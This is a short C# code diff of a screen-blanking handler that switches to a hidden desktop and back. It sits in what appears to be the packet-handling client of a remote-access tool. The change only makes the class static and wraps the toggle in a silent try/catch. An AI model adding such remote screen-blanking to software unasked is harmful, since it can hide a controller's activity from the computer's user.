@@ -6,7 +6,7 @@ using System.Text;
 
 namespace Client.Handle_Packet
 {
-    class HandleBlankScreen
+    public static class HandleBlankScreen
     {
         [DllImport("user32.dll")]
         public static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);
@@ -52,20 +52,23 @@ namespace Client.Handle_Packet
         public static bool switcher = false; //the screen is not blanked be default so this should be false
         public static void RunBlankScreen()
         {
-            //light switch logic CopyPasta by MrDevBot
-
-            if (switcher == false) //The current screen is NOT blanked and needs to be
+            try
             {
-                SwitchDesktop(hNewDesktop);
-                switcher = true; //sets the switch to on for next click
-                return; //returns to calling function
+                //light switch logic CopyPasta by MrDevBot
+                if (switcher == false) //The current screen is NOT blanked and needs to be
+                {
+                    SwitchDesktop(hNewDesktop);
+                    switcher = true; //sets the switch to on for next click
+                    return; //returns to calling function
+                }
+                else //the screen is blanked and should be switched back to old
+                {
+                    SwitchDesktop(hOldDesktop);
+                    switcher = false; //sets the switch to off for next click
+                    return; //returns to calling function
+                }
             }
-            else //the screen is blanked and should be switched back to old
-            {
-                SwitchDesktop(hOldDesktop); 
-                switcher = false; //sets the switch to off for next click
-                return; //returns to calling function
-            }
+            catch { }
         }
     }
 }
